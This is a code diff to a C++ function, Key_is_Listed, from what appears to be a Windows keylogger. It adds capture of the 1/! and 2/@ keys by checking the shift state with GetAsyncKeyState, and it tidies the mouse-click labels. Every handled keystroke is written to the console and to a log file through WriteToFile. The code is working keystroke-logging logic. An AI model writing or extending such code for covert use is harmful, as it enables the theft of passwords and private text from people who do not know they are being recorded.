@@ -42,6 +42,32 @@ bool Key_is_Listed(WORD iKey)
 		}
 		break;
 
+	case 49:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << "!";
+			WriteToFile("!");
+		}
+		else
+		{
+			std::cout << "1";
+			WriteToFile("1");
+		}
+		break;
+
+	case 50:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			std::cout << "@";
+			WriteToFile("@");
+		}
+		else
+		{
+			std::cout << "2";
+			WriteToFile("2");
+		}
+		break;
+
 	case VK_RETURN:
 		std::cout << "\n";
 		WriteToFile("\n");
@@ -111,13 +137,13 @@ bool Key_is_Listed(WORD iKey)
 		break;
 
 	case VK_RBUTTON:
-		std::cout << "* mouse_right *";
-		WriteToFile("* mouse_right *");
+		std::cout << "*mouse_right*";
+		WriteToFile("*mouse_right*");
 		break;
 
 	case VK_LBUTTON:
-		std::cout << "* mouse_left *";
-		WriteToFile("* mouse_left *");
+		std::cout << "*mouse_left*";
+		WriteToFile("*mouse_left*");
 		break;
 
 	default: return false;
